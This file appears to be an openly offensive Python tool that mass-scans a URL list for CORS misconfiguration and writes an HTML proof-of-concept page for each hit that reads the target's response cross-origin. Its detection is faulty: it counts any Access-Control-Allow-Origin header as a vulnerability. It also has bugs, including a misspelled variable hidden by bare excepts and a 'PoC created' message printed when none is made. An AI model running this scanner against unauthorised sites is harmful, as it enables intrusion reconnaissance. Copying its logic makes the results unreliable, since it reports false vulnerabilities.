#!/usr/bin/env python3
from colorama import Fore
import argparse
import requests
import os

def main():
    def banner():
        print(f'''{Fore.LIGHTMAGENTA_EX}
   __________  ____  _____                
  / ____/ __ \/ __ \/ ___/_________ _____ 
 / /   / / / / /_/ /\__ \/ ___/ __ `/ __ \\
/ /___/ /_/ / _, _/___/ / /__/ /_/ / / / /
\____/\____/_/ |_|/____/\___/\__,_/_/ /_/ 
                                          
{Fore.LIGHTMAGENTA_EX}      ╔═════════════════════════╗
      ║{Fore.LIGHTWHITE_EX} Tool Created by MrEmpy  {Fore.LIGHTMAGENTA_EX}║
      ║{Fore.LIGHTWHITE_EX} Version 1.0             {Fore.LIGHTMAGENTA_EX}║
      ╚═════════════════════════╝
        ''')

    poc = '''<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
    '''
    poc2 = '         xhr.open("GET", "{}", true);'
    poc3 = '''
             xhr.withCredentials = false;
             xhr.send();
             }
         </script>
     </body>
 </html>
    '''

    parser = argparse.ArgumentParser()
    parser.add_argument('-l','--list', action='store', help='file containing a list of urls to check', dest='list', required=True)
    parser.add_argument('-v','--valid', action='store', help='show only valid ones. Reply with "yes" or "no"', dest='valids', required=True)
    parser.add_argument('-o','--output', action='store', help='output folder', dest='output', required=False)

    arguments = parser.parse_args()

    list_f = open(arguments.list, 'r').read().splitlines()

    banner()
    for url in list_f:
        try:
            if "http" in url:
                if arguments.valids == 'yes':
                    r = requests.get(url, timeout=10, headers={'Origin': 'cors.mrempy.com'})

                    if "access-control-allow-origin" in r.headers:
                        print(f'{Fore.LIGHTGREEN_EX}[+] CORS Vuln: {url}')

                        if arguments.output:
                            try:
                                os.mkdir(arguments.output)
                            except:
                                pass

                            output_f = open(f'{arguments.output}/vuln.txt', 'a')
                            output_f.write(url + '\n')
                            output_f.close()

                            try:
                                os.mkdir(arguments.output + '/poc')
                            except:
                                pass

                            if 'http' in url:
                                url_r1 = url.replace('http://', '')
                                url_r2 = url.replace('https://', '')
                                url_r3 = url.replace('/', '-')
                                cors_poc = open(f'{arguments.output}/poc/{url_r3}.html', 'a')
                                cors_poc.write(poc)
                                cors_poc.write(poc2.format(url))
                                cors_poc.write(poc3)
                                cors_poc.close()
                            else:
                                url_r1 = url.replace('http://', '')
                                url_r2 = url.replace('https://', '')
                                url_r3 = url.replace('/', '-')
                                cors_poc = open(f'{arguments.output}/poc/{url_r3}.html', 'a')
                                cors_poc.write(poc)
                                cors_poc.write(poc2.format('http://' + url + '/'))
                                cors_poc.write(poc3)
                                cors_poc.close()
                            print(f'{Fore.LIGHTGREEN_EX} └─> PoC created in {arguments.output}/poc/')

                if arguments.valids == 'no':
                    r = requests.get(url, timeout=10, headers={'Origin': 'cors.mrempy.com'})

                    if "access-control-allow-origin" in r.headers:
                        print(f'{Fore.LIGHTGREEN_EX}[+] CORS Vuln: {url}')
                        print(f'{Fore.LIGHTGREEN_EX} └─> PoC created in {arguments.output}/poc/')

                        try:
                            os.mkdir(arguments.output)
                        except:
                            pass

                        output_f = open(f'{arguments.output}/all.txt', 'a')
                        output_f.write('[+] CORS Vuln: ' + url + '\n')
                        output_f.close()
                    else:
                        print(f'{Fore.LIGHTRED_EX}[-] {url}')

                        if arguments.output:
                            try:
                                os.mkdir(arguments.output)
                            except:
                                pass

                            output_f = open(f'{arguments.output}/all.txt', 'a')
                            output_f.write('[-] ' + url + '\n')
                            output_f.close()

                            try:
                                os.mkdir(arguments.output + '/poc')
                            except:
                                pass

            else:
                if arguments.valids == 'yes':
                    r = requests.get('http://' + url + '/', timeout=10, headers={'Origin': 'cors.mrempy.com'})

                    if "access-control-allow-origin" in r.headers:
                        print(f'{Fore.LIGHTGREEN_EX}[+] CORS Vuln: http://{url}/')

                        if arguments.output:
                            try:
                                os.mkdir(arguments.output)
                            except:
                                pass

                            output_f = open(f'{arguments.output}/vuln.txt', 'a')
                            output_f.write('http://' + url + '/\n')
                            output_f.close()

                            try:
                                os.mkdir(arguments.output + '/poc')
                            except:
                                pass
                            
                            if 'http' in url:
                                url_r1 = url.replace('http://', '')
                                url_r2 = url.replace('https://', '')
                                url_r3 = url.replace('/', '-')
                                cors_poc = open(f'{arguments.output}/poc/{url_r3}.html', 'a')
                                cors_poc.write(poc)
                                cors_poc.write(poc2.format(url))
                                cors_poc.write(poc3)
                                cors_poc.close()
                            else:
                                url_r1 = url.replace('http://', '')
                                url_r2 = url.replace('https://', '')
                                url_r3 = url.replace('/', '-')
                                cors_poc = open(f'{arguments.output}/poc/{url_r3}.html', 'a')
                                cors_poc.write(poc)
                                cors_poc.write(poc2.format('http://' + url + '/'))
                                cors_poc.write(poc3)
                                cors_poc.close()
                            print(f'{Fore.LIGHTGREEN_EX} └─> PoC created in {arguments.output}/poc/')

                if arguments.valids == 'no':
                    r = requests.get('http://' + url + '/', timeout=10, headers={'Origin': 'cors.mrempy.com'})

                    if "access-control-allow-origin" in r.headers:
                        print(f'{Fore.LIGHTGREEN_EX}[+] CORS Vuln: http://{url}/')

                        try:
                            os.mkdir(arguments.output)
                        except:
                            pass

                        outut_f = open(f'{arguments.output}/all.txt', 'a')
                        output_f.write('[+] CORS Vuln: http://' + url + '/\n')
                        output_f.close()

                        if arguments.output:
                            try:
                                os.mkdir(arguments.output)
                            except:
                                pass

                            output_f = open(f'{arguments.output}/all.txt', 'a')
                            output_f.write('[+] CORS Vuln: http://' + url + '/\n')
                            output_f.close()

                            try:
                                os.mkdir(arguments.output + '/poc')
                            except:
                                pass
                            
                            if 'http' in url:
                                url_r1 = url.replace('http://', '')
                                url_r2 = url.replace('https://', '')
                                url_r3 = url.replace('/', '-')
                                cors_poc = open(f'{arguments.output}/poc/{url_r3}.html', 'a')
                                cors_poc.write(poc)
                                cors_poc.write(poc2.format(url))
                                cors_poc.write(poc3)
                                cors_poc.close()
                            else:
                                url_r1 = url.replace('http://', '')
                                url_r2 = url.replace('https://', '')
                                url_r3 = url.replace('/', '-')
                                cors_poc = open(f'{arguments.output}/poc/{url_r3}.html', 'a')
                                cors_poc.write(poc)
                                cors_poc.write(poc2.format('http://' + url + '/'))
                                cors_poc.write(poc3)
                                cors_poc.close()
                            print(f'{Fore.LIGHTGREEN_EX} └─> PoC created in {arguments.output}/poc/')

                    else:
                        print(f'{Fore.LIGHTRED_EX}[-] http://{url}/')

                        if arguments.output:
                            try:
                                os.mkdir(arguments.output)
                            except:
                                pass

                            output_f = open(f'{arguments.output}/all.txt', 'a')
                            output_f.write('[-] http://' + url + '/\n')
                            output_f.close()

                            try:
                                os.mkdir(arguments.output + '/poc')
                            except:
                                pass

        except:
            pass
    print(f'{Fore.LIGHTBLUE_EX}[*] Job done. Have a good hack ;)')

if __name__ == '__main__':
    main()
